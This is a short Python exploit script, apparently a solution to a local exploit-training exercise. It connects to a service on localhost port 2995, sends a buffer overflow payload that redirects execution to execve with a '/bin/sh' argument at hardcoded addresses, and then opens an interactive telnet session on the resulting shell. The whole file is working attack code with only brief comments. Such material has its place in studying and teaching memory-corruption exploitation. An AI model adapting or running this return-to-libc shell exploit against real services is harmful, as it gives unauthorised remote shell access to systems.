import socket
import struct
import telnetlib

HOST = "127.0.0.1"
PORT = 2995

# Establishes connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

padding = "A"*511 + "\x00"*21
# Address of execve function in Global Offset Table
execve = struct.pack("I", 0x08048c0c)
# Path to "/bin/sh"
bin_sh = struct.pack("I", 0xb7e97000 + 1176511)

# Executes "/bin/sh" command with proper arguments
exploit = padding + execve + "A"*4 + bin_sh + "\x00"*8

# Sends exploit to server
s.send(exploit + "\n")

# Opens interactive Telnet terminal with server
telnet = telnetlib.Telnet()
telnet.sock = s
telnet.interact()
